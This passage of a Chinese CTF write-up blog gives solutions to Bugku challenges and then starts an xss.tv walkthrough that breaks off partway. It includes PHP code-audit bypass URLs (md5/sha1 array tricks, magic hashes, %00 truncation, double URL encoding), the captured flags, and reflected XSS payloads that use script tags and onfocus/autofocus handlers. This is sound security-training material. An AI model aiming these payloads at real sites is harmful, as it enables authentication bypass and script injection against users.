href="https://github.com/findneo/fcode" target="_blank" rel="noopener">小工具</a> </p><h4 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h4><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Ook!解混淆</a> </p><p><code>flag{ok-ctf-1234-admin}</code> </p><h4 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h4><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck解混淆</a> </p><p><code>flag{ok-c2tf-3389-admin}</code> </p><h4 id=""><a href="#" class="headerlink" title="+[]-"></a>+[]-</h4><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Brainfuck解混淆</a> </p><p><code>flag{bugku_jiami_23}</code>  </p><h4 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h4><p>将第六字节改为00即可。<code>flag{Adm1N-B2G-kU-SZIP}</code></p><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/18.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/18.php?username[]=1&amp;password[]=</code></p><p><code>Flag: flag{bugk1u-ad8-3dsa-2}</code> </p><h4 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line"><span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'flag&#123;xxx&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/6.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) <span class="comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span></span><br><span class="line"><span class="comment">//比较两个字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/6.php?a[]</code></p><p><code>Flag: flag{bugku_dmsj_912k}</code> </p><h4 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/10.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"</span></span><br><span class="line"><span class="string">not allowed!</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">Access granted!</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">flag</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/10.php?id=hackerD%254a</code></p><p><code>flag{bugku__daimasj-1t2}</code> </p><h4 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/19.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/19.php?password=a%00--</code></p><p><code>flag{ctf-bugku-ad-2131212}</code> </p><h4 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/22.php</span></span><br><span class="line"></span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line">is_numeric($temp)?<span class="keyword">die</span>(<span class="string">"no numeric"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>($temp&gt;<span class="number">1336</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/22.php?password=1337x</code> </p><p><code>flag{bugku_null_numeric}</code> </p><h4 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/7.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"</span></span><br><span class="line"><span class="string">"</span>;</span><br><span class="line">var_dump($_GET[<span class="string">'password'</span>]);</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'name'</span>]));</span><br><span class="line">var_dump(sha1($_GET[<span class="string">'password'</span>]));</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your password can not be your name!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Invalid password.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'</span></span><br><span class="line"><span class="string">Login first!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/7.php?name[]&amp;password[]=1</code> </p><p><code>flag{bugku--daimasj-a2}</code> </p><h4 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/13.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$md51 = md5(<span class="string">'QNKCDZO'</span>);</span><br><span class="line">$a = @$_GET[<span class="string">'a'</span>];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line"><span class="keyword">if</span> ($a != <span class="string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;*&#125;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"false!!!"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">"please input a"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/13.php?a=240610708</code></p><p><code>flag{bugku-dmsj-am9ls}</code></p><h4 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/20.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($temp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line">$one = ord(<span class="string">'1'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$nine = ord(<span class="string">'9'</span>); <span class="comment">//ord — 返回字符的 ASCII 码值</span></span><br><span class="line">$number = <span class="string">'3735929054'</span>;</span><br><span class="line"><span class="comment">// Check all the input characters!</span></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Disallow all the digits!</span></span><br><span class="line">$digit = ord($temp&#123;$i&#125;);</span><br><span class="line"><span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Aha, digit not allowed!</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">"flase"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($number == $temp)</span><br><span class="line"><span class="keyword">return</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">$temp = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">echo</span> noother_says_correct($temp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/20.php?password=0xdeadc0de</code></p><p><code>flag{Bugku-admin-ctfdaimash}</code></p><h4 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/5.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"xxx"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="string">'password'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'You password must be alphanumeric'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">'password'</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">'password'</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (strpos ($_GET[<span class="string">'password'</span>], <span class="string">'*-*'</span>) !== <span class="keyword">FALSE</span>) <span class="comment">//strpos — 查找字符串首次出现的位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span> . $flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">'- have not been found'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/5.php?password=9e9%00*-*</span></span><br></pre></td></tr></table></figure><p><code>flag{bugku-dm-sj-a12JH8}</code></p><h4 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/15.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'ctf'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'ctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'ctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://120.24.86.145:9009/15.php?ctf=1%00%23biubiubiu</code> </p><p>或</p><p><code>http://120.24.86.145:9009/15.php?ctf[]</code></p><p><code>flag{Bugku-D-M-S-J572}</code> </p><h4 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9009/21.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) <span class="comment">//preg_match — 执行一个正则表达式匹配</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">&#123;</span><br><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>flag{Bugku_preg_match}</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>xss.tv挑战赛</title>
      <link href="/180405XSSTVChallenge/"/>
      <url>/180405XSSTVChallenge/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="http://test.xss.tv" target="_blank" rel="noopener">http://test.xss.tv</a></p><p><a href="http://47.94.13.75/test/" target="_blank" rel="noopener">http://47.94.13.75/test/</a></p></blockquote><p><code>test on Firefox  54.0 (64-bit)</code> </p><h1 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level1.php?name=test</span></span><br><span class="line">&lt;h2 align=center&gt;欢迎用户test&lt;<span class="regexp">/h2&gt;</span></span><br><span class="line"><span class="regexp">直接在文本中输出用户提交的变量</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/47.94.13.75/</span>test/level1.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert()</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">收获：为HTML body添加标签。</span><br></pre></td></tr></table></figure><h1 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level2.php?keyword=test</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"test"</span>&gt;</span><br><span class="line">直接在标签属性中用户提交的变量</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level2.php?keyword="&gt;&lt;script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号、闭合标签并在标签外添加script标签。</span><br></pre></td></tr></table></figure><h1 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level3.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='</span><span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;'</span>&gt;</span><br><span class="line"></span><br><span class="line">两处输出都对双引号、尖括号和&amp;进行了HTML实体编码，但前面的单引号可以被闭合，考虑使用input标签的某些事件执行脚本。</span><br><span class="line">自动聚焦到输入框，打开就弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onfocus='alert()' autofocus='</span></span><br><span class="line">点击页面非输入框的任何地方以移开焦点</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  autofocus onblur='alert()</span></span><br><span class="line">点击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onfocus='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  onclick='alert()</span></span><br><span class="line">在输入框输入</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' oninput='alert()</span></span><br><span class="line">输入然后点击搜索</span><br><span 